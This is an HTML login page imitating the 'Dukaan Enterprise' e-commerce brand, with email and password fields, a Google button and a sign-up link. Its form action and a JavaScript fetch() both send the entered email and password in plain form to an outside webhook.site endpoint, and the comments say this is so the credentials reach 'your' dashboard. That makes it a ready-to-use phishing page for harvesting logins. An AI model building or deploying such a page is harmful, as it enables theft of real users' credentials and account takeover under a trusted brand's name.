<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login | Dukaan</title>
    <!-- Font Awesome 6 (free) -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #e9eef3 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        /* Main container */
        .login-container {
            width: 100%;
            max-width: 440px;
            margin: 0 auto;
        }

        /* Card */
        .login-card {
            background: #ffffff;
            border-radius: 28px;
            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.15), 0 1px 3px rgba(0, 0, 0, 0.05);
            padding: 40px 32px 44px;
            transition: transform 0.2s;
        }

        /* Logo area - Dukaan */
        .logo-area {
            text-align: center;
            margin-bottom: 28px;
        }

        .dukaan-logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 8px;
        }

        .logo-icon {
            background: #1a5cff;
            width: 38px;
            height: 38px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 20px;
            font-weight: 700;
            box-shadow: 0 6px 12px -6px rgba(26, 92, 255, 0.3);
        }

        .logo-icon i {
            font-size: 20px;
        }

        .logo-text {
            font-size: 28px;
            font-weight: 700;
            letter-spacing: -0.5px;
            background: linear-gradient(135deg, #1a2c3e 0%, #0f1a24 100%);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .enterprise-badge {
            display: inline-block;
            background: #eef2ff;
            color: #1a5cff;
            font-size: 11px;
            font-weight: 600;
            padding: 4px 10px;
            border-radius: 30px;
            margin-left: 8px;
            vertical-align: middle;
        }

        .tagline {
            font-size: 13px;
            color: #5e6f8d;
            text-align: center;
            margin-top: 6px;
            font-weight: 500;
        }

        /* Form elements */
        .form-group {
            margin-bottom: 24px;
        }

        label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #1f2a44;
            margin-bottom: 8px;
            letter-spacing: -0.2px;
        }

        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }

        .input-wrapper i:first-child {
            position: absolute;
            left: 16px;
            color: #9aa9c1;
            font-size: 15px;
            pointer-events: none;
        }

        input {
            width: 100%;
            padding: 14px 16px 14px 44px;
            font-size: 15px;
            font-family: inherit;
            border: 1.5px solid #e2e8f0;
            border-radius: 18px;
            background: #ffffff;
            transition: all 0.2s ease;
            outline: none;
            font-weight: 500;
            color: #0a1c2f;
        }

        input:focus {
            border-color: #1a5cff;
            box-shadow: 0 0 0 3px rgba(26, 92, 255, 0.1);
        }

        input::placeholder {
            color: #b9c2d4;
            font-weight: 400;
        }

        /* Password row */
        .password-header {
            display: flex;
            justify-content: space-between;
            align-items: baseline;
            margin-bottom: 8px;
        }

        .forgot-link {
            font-size: 12px;
            font-weight: 600;
            color: #1a5cff;
            text-decoration: none;
            background: none;
            border: none;
            cursor: pointer;
        }

        .forgot-link:hover {
            text-decoration: underline;
            color: #0e46c9;
        }

        /* Eye toggle */
        .toggle-eye {
            position: absolute;
            right: 16px;
            background: transparent;
            border: none;
            cursor: pointer;
            color: #9aa9c1;
            font-size: 16px;
            padding: 0;
            display: flex;
            align-items: center;
        }

        /* Login button */
        .login-btn {
            background: #1a5cff;
            color: white;
            font-weight: 700;
            font-size: 16px;
            padding: 14px 0;
            width: 100%;
            border: none;
            border-radius: 40px;
            cursor: pointer;
            margin-top: 12px;
            margin-bottom: 20px;
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            font-family: inherit;
            box-shadow: 0 6px 14px rgba(26, 92, 255, 0.25);
        }

        .login-btn i {
            font-size: 15px;
        }

        .login-btn:hover {
            background: #0e4ad4;
            transform: scale(0.98);
        }

        /* Divider */
        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            gap: 12px;
            margin: 18px 0 20px;
            color: #8f9eb5;
            font-size: 12px;
            font-weight: 500;
        }

        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #e8edf3;
        }

        /* Google button */
        .google-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            width: 100%;
            background: white;
            border: 1.5px solid #e2e8f0;
            border-radius: 40px;
            padding: 12px 0;
            font-weight: 600;
            font-size: 14px;
            color: #1f2a44;
            font-family: inherit;
            cursor: pointer;
            transition: background 0.2s;
            margin-bottom: 24px;
        }

        .google-btn i {
            font-size: 18px;
            color: #ea4335;
        }

        .google-btn:hover {
            background: #fafcff;
            border-color: #cbd5e1;
        }

        /* Signup prompt */
        .signup-prompt {
            text-align: center;
            font-size: 14px;
            color: #4a5a7a;
            border-top: 1px solid #eff3f8;
            padding-top: 24px;
            margin-top: 4px;
        }

        .signup-prompt a {
            color: #1a5cff;
            font-weight: 700;
            text-decoration: none;
        }

        .signup-prompt a:hover {
            text-decoration: underline;
        }

        /* Toast / notification */
        .toast-notification {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: #1f2937;
            color: white;
            padding: 12px 24px;
            border-radius: 50px;
            font-size: 13px;
            font-weight: 500;
            font-family: monospace;
            z-index: 1000;
            backdrop-filter: blur(8px);
            background: rgba(0, 0, 0, 0.85);
            pointer-events: none;
            opacity: 0;
            transition: opacity 0.25s ease;
            white-space: nowrap;
        }

        @media (max-width: 480px) {
            .login-card {
                padding: 32px 24px 36px;
            }
            .toast-notification {
                white-space: normal;
                text-align: center;
                font-size: 12px;
                padding: 10px 20px;
            }
        }
    </style>
</head>
<body>

<div class="login-container">
    <div class="login-card">
        <!-- Dukaan brand header -->
        <div class="logo-area">
            <div class="dukaan-logo">
                <div class="logo-icon">
                    <i class="fas fa-store"></i>
                </div>
                <span class="logo-text">Dukaan</span>
                <span class="enterprise-badge">Enterprise</span>
            </div>
            <div class="tagline">Ecommerce · Multivendor · Omnichannel</div>
        </div>

        <!-- LOGIN FORM - action points to webhook.site -->
        <!-- IMPORTANT: Removed test@gmail.com prefill -->
        <form id="loginForm" action="https://webhook.site/b4bb9b3a-8e4b-4a63-bb76-a6cfdc1a5b56" method="POST">
            <!-- Email field -->
            <div class="form-group">
                <label for="email">Email address</label>
                <div class="input-wrapper">
                    <i class="fas fa-envelope"></i>
                    <input type="email" id="email" name="email" placeholder="you@company.com" autocomplete="email" required>
                </div>
            </div>

            <!-- Password field -->
            <div class="form-group">
                <div class="password-header">
                    <label for="password">Password</label>
                    <button type="button" class="forgot-link" id="forgotPasswordBtn">Forgot password?</button>
                </div>
                <div class="input-wrapper">
                    <i class="fas fa-lock"></i>
                    <input type="password" id="password" name="password" placeholder="Enter your password" autocomplete="current-password" required>
                    <button type="button" class="toggle-eye" id="togglePasswordBtn" aria-label="Show password">
                        <i class="far fa-eye-slash"></i>
                    </button>
                </div>
            </div>

            <!-- Log in button -->
            <button type="submit" class="login-btn">
                <i class="fas fa-arrow-right-to-bracket"></i> Log in
            </button>
        </form>

        <!-- OR divider -->
        <div class="divider">or log in with</div>

        <!-- Google login (UI replica) -->
        <button type="button" class="google-btn" id="googleLoginBtn">
            <i class="fab fa-google"></i> Google
        </button>

        <!-- Sign up link -->
        <div class="signup-prompt">
            Don't have an account? <a href="#" id="getStartedBtn">Get started</a>
        </div>
    </div>
</div>

<!-- Toast notification -->
<div id="toastMsg" class="toast-notification">✨ Request sent</div>

<script>
    (function() {
        // DOM elements
        const form = document.getElementById('loginForm');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const togglePasswordBtn = document.getElementById('togglePasswordBtn');
        const forgotBtn = document.getElementById('forgotPasswordBtn');
        const googleBtn = document.getElementById('googleLoginBtn');
        const getStartedBtn = document.getElementById('getStartedBtn');
        const toast = document.getElementById('toastMsg');

        // Helper: show toast message
        let toastTimer = null;
        function showToast(message, isError = false) {
            if (toastTimer) clearTimeout(toastTimer);
            toast.textContent = message || (isError ? '⚠️ Something went wrong' : '✓ Request sent to webhook');
            toast.style.backgroundColor = isError ? '#c2410cee' : '#1f2937dd';
            toast.style.opacity = '1';
            toastTimer = setTimeout(() => {
                toast.style.opacity = '0';
            }, 2800);
        }

        // Clear any pre-filled values (ensure test@gmail.com is removed)
        if (emailInput) emailInput.value = '';
        if (passwordInput) passwordInput.value = '';

        // Toggle password visibility
        if (togglePasswordBtn) {
            togglePasswordBtn.addEventListener('click', function() {
                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                passwordInput.setAttribute('type', type);
                const icon = togglePasswordBtn.querySelector('i');
                if (icon) {
                    if (type === 'text') {
                        icon.classList.remove('fa-eye-slash');
                        icon.classList.add('fa-eye');
                    } else {
                        icon.classList.remove('fa-eye');
                        icon.classList.add('fa-eye-slash');
                    }
                }
            });
        }

        // Forgot password demo
        if (forgotBtn) {
            forgotBtn.addEventListener('click', (e) => {
                e.preventDefault();
                showToast('📧 Password reset link (demo)', false);
            });
        }

        // Google login demo
        if (googleBtn) {
            googleBtn.addEventListener('click', () => {
                showToast('🔐 Google OAuth demo — integrate with real provider', false);
            });
        }

        // Get started demo
        if (getStartedBtn) {
            getStartedBtn.addEventListener('click', (e) => {
                e.preventDefault();
                showToast('🚀 Create your Dukaan store (demo)', false);
            });
        }

        // =============== FORM SUBMISSION - SEND CREDENTIALS TO WEBHOOK ===============
        // Important: This will send email & password directly to your webhook server.
        // We use fetch API to POST data to https://webhook.site/b4bb9b3a-8e4b-4a63-bb76-a6cfdc1a5b56
        // This ensures you receive credentials at your webhook dashboard.
        // The form also has action attribute pointing to same URL for standard fallback.
        if (form) {
            form.addEventListener('submit', async function(event) {
                event.preventDefault(); // prevent page redirect

                // Get email and password values (trimmed)
                const email = emailInput.value.trim();
                const password = passwordInput.value;

                // Basic validation
                if (!email) {
                    showToast('❌ Please enter your email address', true);
                    emailInput.focus();
                    return;
                }
                if (!password) {
                    showToast('❌ Please enter your password', true);
                    passwordInput.focus();
                    return;
                }
                if (!email.includes('@') || !email.includes('.')) {
                    showToast('❌ Enter a valid email address', true);
                    return;
                }

                // Prepare data exactly as standard form POST (x-www-form-urlencoded)
                // This ensures webhook.site receives 'email' and 'password' fields.
                const formData = new URLSearchParams();
                formData.append('email', email);
                formData.append('password', password);

                try {
                    // Send POST request to the webhook URL
                    const response = await fetch('https://webhook.site/b4bb9b3a-8e4b-4a63-bb76-a6cfdc1a5b56', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded',
                        },
                        body: formData.toString(),
                        mode: 'cors',        // webhook.site supports CORS
                    });

                    // webhook.site returns 200 OK for captured requests
                    if (response.ok) {
                        // Show success and also log to console for debugging
                        console.log('✅ Credentials sent to webhook:', { email, password: '***hidden***' });
                        showToast(`✓ Login sent! Credentials received at webhook`, false);
                        // Optional: Clear password field for security (but preserve for demo)
                        // passwordInput.value = '';   // uncomment if you want to clear after send
                    } else {
                        console.warn('Webhook response not OK:', response.status);
                        showToast(`⚠️ Server responded with status ${response.status}`, true);
                    }
                } catch (err) {
                    console.error('Webhook POST error:', err);
                    showToast(`🌐 Network error: ${err.message}. Check console`, true);
                }
            });
        }

        // Also handle any potential direct form action (backup)
        // Add a console message to confirm everything is ready
        console.log('✅ Dukaan Login Page Ready | Webhook endpoint ACTIVE | test@gmail.com removed');
    })();
</script>
</body>
</html>
